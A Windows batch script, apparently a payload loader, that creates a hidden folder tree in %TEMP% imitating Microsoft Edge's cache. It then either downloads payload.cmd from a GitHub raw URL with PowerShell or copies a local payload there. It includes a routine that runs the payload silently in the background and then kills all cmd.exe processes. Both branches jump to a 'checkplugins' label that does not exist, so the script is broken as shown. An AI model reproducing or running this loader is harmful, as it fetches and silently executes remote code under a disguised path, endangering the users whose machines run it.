@echo off

cd %TEMP% > nul
md .edge > nul
cd .edge > nul
md "Microsoft Edge" > nul
cd "Microsoft Edge" > nul
md cache > nul
md userdata > nul
md Default > nul
cd cache > nul
md Downloads > nul
md Bookmarks > nul
md Application > nul
cd Application > nul

if "%1"=="url" goto online
if "%1"=="path" goto local
goto fail

:online
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/realgamebreaker/cmdloader/main/payload.cmd -OutFile payload.cmd"
goto checkplugins

:local
xcopy "C:\Path\to\your\Payload.cmd" "%TEMP%\.edge\Microsoft Edge\cache\Application\payload.cmd" /y
goto checkplugins

:silentrun
start /B cmd /C "payload.cmd"
goto exit


:fail
echo.
echo Correct Usage: load.cmd [url/path] (--silent)
pause

:exit
taskkill /f /im cmd.exe
